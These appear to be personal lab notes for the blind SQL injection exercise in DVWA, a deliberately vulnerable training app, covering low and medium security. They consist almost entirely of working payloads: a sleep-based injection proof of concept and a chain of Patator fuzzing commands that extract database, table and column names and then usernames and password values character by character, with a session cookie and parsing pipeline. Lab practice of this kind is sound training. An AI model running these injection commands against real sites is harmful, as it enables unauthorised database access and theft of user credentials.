LOW

[[Patator]]

http://dvwa.local/vulnerabilities/sqli_blind/?id=1

POC:
```
1' AND sleep (10)-- - 
```

Find the length of the database:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and length(database())='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:1-10" -x ignore:fgrep="User ID is MISSING from the database."
```

Retrieve the name of the database:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and ascii(substring(database(),RANGE0,1))='RANGE1&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:1-4" 1="int:1-256" -x ignore:fgrep="User ID is MISSING from the database."
```

```bash - kali
cat patatorASCII | awk '{print $9}' | cut -d : -f 3 | tr -d " \t\n\r" 
```

Paste in values here, may not be in correct order!
https://onlineasciitools.com/convert-decimal-to-ascii

Find number of databases:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and (SELECT count(schema_name) from information_schema.schemata)='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:1-10" -x ignore:fgrep="User ID is MISSING from the database."
```

Find names of databases:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT schema_name from information_schema.schemata LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:0-1" 1="int:1-20" 2="int:1-256" -x ignore:fgrep="User ID is MISSING from the database."
```

```bash - kali
cat patatorASCII | awk '{print $9}' | cut -d : -f 3 | tr -d " \t\n\r" 
```

Paste in values here, may not be in correct order!
https://onlineasciitools.com/convert-decimal-to-ascii

`information_schema` and `dvwa`

Enumerate dvwa tables:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and (SELECT count(table_name) from information_schema.tables where table_schema='dvwa')='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:1-10" -x ignore:fgrep="User ID is MISSING from the database."
```

Enumerate the table names:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT table_name from information_schema.tables where table_schema='dvwa' LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:0-1" 1="int:1-20" 2="int:1-256" -x ignore:fgrep="User ID is MISSING from the database."
```


```bash - kali
cat patatorASCII | awk '{print $9}' | cut -d : -f 3 | tr -d " \t\n\r" 
```

Paste in values here, may not be in correct order!
https://onlineasciitools.com/convert-decimal-to-ascii

`guestbook` and `users`

Enumerate `users` table:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and (SELECT count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:1-10" -x ignore:fgrep="User ID is MISSING from the database."
```

There are 8 columns, enumerate the names of the columns:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT column_name from information_schema.columns where table_schema='dvwa' and table_name='users' LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:0-7" 1="int:1-20" 2="int:1-256" -x ignore:fgrep="User ID is MISSING from the database."
```

```bash - kali
cat patatorASCII | awk '{print $9}' | cut -d : -f 3 | tr -d " \t\n\r" 
```

Paste in values here, may not be in correct order!
https://onlineasciitools.com/convert-decimal-to-ascii

`user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`, `last_login` and `failed_login`

Enumerate `first_name` and `users`
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and (SELECT count(first_name) from dvwa.users)='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:1-10" -x ignore:fgrep="User ID is MISSING from the database."
```

Enumerate first_name:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT first_name from dvwa.users LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:0-7" 1="int:1-20" 2="int:1-256" -x ignore:fgrep="User ID is MISSING from the database."
```

```bash - kali
cat patatorASCII | awk '{print $9}' | cut -d : -f 3 | tr -d " \t\n\r" 
```

Paste in values here, may not be in correct order!
https://onlineasciitools.com/convert-decimal-to-ascii

`admin`, `Gordon`, `Hack`, `Palbo`, `Bob`

Enumerate users:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT user from dvwa.users LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:0-7" 1="int:1-20" 2="int:1-256" -x ignore:fgrep="User ID is MISSING from the database."
```

```bash - kali
cat patatorASCII | awk '{print $9}' | cut -d : -f 3 | tr -d " \t\n\r" 
```

Paste in values here, may not be in correct order!
https://onlineasciitools.com/convert-decimal-to-ascii

Enumerate passwords:
```bash - kali
python3 patator.py http_fuzz url="http://dvwa.local/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT password from dvwa.users LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=vn5pl1pirs5h9heugved2tjrsg; security=low" 0="int:0-7" 1="int:1-20" 2="int:1-256" -x ignore:fgrep="User ID is MISSING from the database."
```

```bash - kali
cat patatorASCII | awk '{print $9}' | cut -d : -f 3 | tr -d " \t\n\r" 
```

Paste in values here, may not be in correct order!
https://onlineasciitools.com/convert-decimal-to-ascii

MEDIUM

Same as above, however, the `'` needs to be removed from all payloads, such as:

POC:
```
1 AND sleep (10)-- - 
```